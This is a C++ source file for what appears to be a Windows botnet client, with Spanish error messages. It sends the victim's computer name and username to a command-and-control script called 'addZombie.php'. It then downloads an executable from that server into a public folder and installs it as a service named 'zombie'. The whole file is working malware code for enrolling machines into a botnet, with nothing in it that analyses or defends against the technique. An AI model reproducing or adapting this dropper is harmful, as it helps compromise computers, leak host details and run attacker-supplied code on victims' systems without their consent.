#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <iostream>
#include <lmcons.h>
#include <conio.h>
#include <sstream>
#include <string>
#include "download.h"
#include "activeService.h"

#pragma comment(lib, "wininet.lib")

using namespace std;

int main() {
    bool downloadSuccess = false;
    bool serviceSuccess = false;
    char pcName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    TCHAR username[UNLEN + 1];
    DWORD usernameLen = UNLEN + 1;
    GetComputerNameA(pcName, &size);
    GetUserNameA(username, &usernameLen);
    string os = "Windows";

    cout << "PC Name: " << pcName << "\n" << "Username: " << username << "\n" << "OS: " << os << "\n";

    const char* url = "http://10.231.221.222/C2WebServer/controller/addZombie.php";
    string getData = "?pcName=" + string(pcName) + "&username=" + string(username) + "&os=" + os;

    HINTERNET hInternet = InternetOpenA("HTTPGET", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        std::cerr << "Error al abrir la sesión de Internet" << std::endl;
        return 1;
    }

    string fullUrl = url + getData;
    HINTERNET hConnect = InternetOpenUrlA(hInternet, fullUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        std::cerr << "Error al abrir la URL" << std::endl;
        InternetCloseHandle(hInternet);
        return 1;
    }

    DWORD bytesRead = 0;
    CHAR buffer[4096];

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        std::cout.write(buffer, bytesRead);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    cout << "Press any key to continue...";

    downloadSuccess = downloadFile("http://10.231.221.222/C2WebServer/bin/service.exe", "C:\\Users\\Public\\Music\\service.exe");

    if(!downloadSuccess) {
        cerr << "Error downloading file" << endl;
        return 1;
    }

    serviceSuccess = InstallService("zombie", "C:\\Users\\Public\\Music\\service.exe");

    if(!serviceSuccess) {
        cerr << "Error installing service" << endl;
        return 1;
    }
    else {
        cout << "Service installed successfully" << endl;
    }

    getch();
    return 0;
}
 